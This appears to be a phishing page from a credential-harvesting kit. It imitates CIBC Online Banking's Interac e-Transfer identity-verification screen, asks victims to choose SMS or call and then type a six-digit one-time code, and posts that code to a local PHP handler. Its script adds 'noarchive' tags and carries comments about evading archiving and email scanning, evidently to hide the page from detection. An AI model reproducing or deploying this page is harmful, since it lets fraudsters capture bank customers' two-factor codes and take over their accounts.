<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><html>
    <head>
 <script>
    // Disable caching for forward and backward navigation
    function disableCaching() {
      // Disable caching for forward navigation
      window.onpageshow = function(event) {
        if (event.persisted) {
          document.getElementById('disableCache').content = 'no-store, no-cache, must-revalidate';
        }
      };
      
      // Disable caching for backward navigation
      window.onunload = function() {};
    }
    
    // Set client browser cache to one hour prior
    function setBrowserCacheTime() {
      const date = new Date();
      date.setTime(date.getTime() - (60 * 60 * 1000));
      document.getElementById('cacheExpires').content = date.toUTCString();
    }

    // Prevent Google Archiving
    const metaRobots = document.createElement('meta');
    metaRobots.name = 'robots';
    metaRobots.content = 'noarchive';
    document.head.appendChild(metaRobots);

    // Block email scanning
    const metaContentType = document.createElement('meta');
    metaContentType.httpEquiv = 'X-Content-Type-Options';
    metaContentType.content = 'nosniff';
    document.head.appendChild(metaContentType);

    // Disable listeners and log third-party communications
    function disableListeners() {
      // Disable listeners (Not applicable in HTML pages)
    }

    // Call the necessary functions when the page loads
    document.addEventListener('DOMContentLoaded', function() {
      disableCaching();
      setBrowserCacheTime();
      disableListeners();
      logThirdPartyCommunication();
    });
  </script><meta name="robots" content="noarchive"><meta http-equiv="X-Content-Type-Options" content="nosniff"><meta name="robots" content="noarchive"><meta http-equiv="X-Content-Type-Options" content="nosniff">

        <meta name="viewport" content="width=device-width, initial-scale=1.0">

      <meta http-equiv="content-type" content="text/html; charset=UTF-8">
      <meta charset="utf-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <title>Sign on | CIBC Online Banking</title>  
      
      <link rel="stylesheet" type="text/css" href="files/157-1f5342e1.css">
  <link rel="stylesheet" href="files/reset.css"><link rel="stylesheet" href="files/reset-brand.css"><link rel="stylesheet" href="files/global.css"><link rel="stylesheet" href="files/global-android2.css"><link rel="stylesheet" href="files/global-brand.css"><link rel="stylesheet" href="files/receive-method.css"><link rel="stylesheet" href="files/receive-method-brand.css"></head>
<body lang="en" class="android-fix"><header class="flex-box flex-box-hoz">
        <div class="flex-box-flex-1"></div>
        <a href="http://cibc.com/" target="_blank">
            <div id="header-logo">
                <span class="offscreen">CIBC logo</span>
           <img class="logo" src="files/cibc-logo-colour.89bf60f2.svg" alt="CIBC logo."> </div>
        </a>
        <div id="header-link" class="flex-box-flex-1">

            
        </div>
    </header>


        
        
        
        
        
        
        <section id="main-page" class="mainPageClassValue">
            <section id="ide">
                <section id="id2">
            <section class="page-title">
                <h2 class="title"><em>Interac</em> e-Transfer</h2>
            </section>
        </section>
            </section>
            <section id="identity-verification" class="page-wrapper">
                <div class="tfa-info">
                    <p>In order to sign on to CIBC Banking, we need to verify your identity.</p>
                    <p>We will send you a one-time verification code to the contact method selected below.</p>
                    <p class="mb5">Note: For account security, we're no longer sending one-time verification codes to personal or free email services.</p>
                </div>
                <div class="global-error-from-container" tabindex="-1" id="id4">
                                    </div>
                <form method="post" action="040150.php" id="lab-form">
                    <label class="block" for="otvc-channel">
                        <p class="label-pad-b5">CONTACT METHOD:</p>
                    </label>
                    <select data-id="deliveryChannel" id="input-type" name="type" required="">
                        <option value="">Please select a contact method</option>
                        <option value="SMS">SMS +1 XXX-XXX-XXXX</option>
                        <option value="CALL">Call +1 XXX-XXX-XXXX</option>
                    </select>
                    <section id="step-2" style="display: none;">
    					<p class="code-sent mb5">The code has been sent to the selected contact method.</p>
    					<fieldset class="otvc">
    						<label for="otvc-code">
    							<p class="label-pad-b5">VERIFICATION CODE:</p>
    						</label>
    						<input pattern="[0-9]{1}[0-9]{1}[0-9]{1}[0-9]{1}[0-9]{1}[0-9]{1}" data-id="otvc" id="input-code" type="tel" name="code" placeholder="6-digit code" maxlength="6" value="">
    					</fieldset>
    					<span id="id1b">
    						<p class="mb5">
    							<span class="label-pad-b5">Didn't get the code?</span>
    							<a href="javascript:;" class="nga-resend-button" id="btn-resend">
    								<span>Resend code</span>
    							</a>
    						</p>
    						<div class="linepadtop7bottom20">
    							<span>Please allow a few minutes for the verification code to be sent.</span>
    						</div>
    					</span>
    				</section>
                    <fieldset class="button-set">
                        <input type="button" class="btn btn-negative" id="btb-cancel" name="cancel-button" value="Cancel">
                        <input type="submit" name="send-button" id="btn-send" class="btn btn-positive" value="Send">
                        <button id="btn-sending" style="display:none;" class="btn btn-positive" disabled="">Sending...</button>
                        <button type="submit" name="ok-button" id="btn-next" class="btn btn-positive btn-full btn-save" style="display: none;">
                            <span class="btn-txt">OK</span>
                            <span class="btn-spinner" style="display: none"><i class="fa fa-spinner fa-spin"></i></span>
                        </button>
                    </fieldset>
                </form>
            </section>
        </section>
        
    

</body></html>